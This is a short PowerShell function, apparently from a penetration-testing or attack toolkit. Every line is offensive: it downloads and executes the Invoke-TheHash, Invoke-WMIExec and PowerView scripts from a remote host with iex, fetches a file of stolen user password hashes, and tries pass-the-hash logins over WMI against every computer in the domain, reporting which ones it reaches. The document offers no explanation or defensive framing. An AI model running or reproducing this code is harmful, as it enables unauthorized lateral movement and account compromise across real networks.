function CheckRemoteHostAccess{
	
	iex (new-object Net.WebClient).DownloadString('http://192.168.50.44/tools/Invoke-TheHash.ps1')
	iex (new-object Net.WebClient).DownloadString('http://192.168.50.44/tools/Invoke-WMIExec.ps1')
	iex (new-object Net.WebClient).DownloadString('http://192.168.50.44/tools/PowerView.ps1')
	Invoke-WebRequest -Uri 'http://192.168.50.44/tools/user_hashes.txt' -OutFile '.\user_hashes.txt'

	Get-Content .\user_hashes.txt | ForEach-Object {$array=$_.Split(":"); echo $array[0]; Get-NetComputer | %{Invoke-TheHash -Type WMIExec -Target $_ -Username $array[0] -Hash $array[1]}} | Select-String -Pattern 'accessed'
}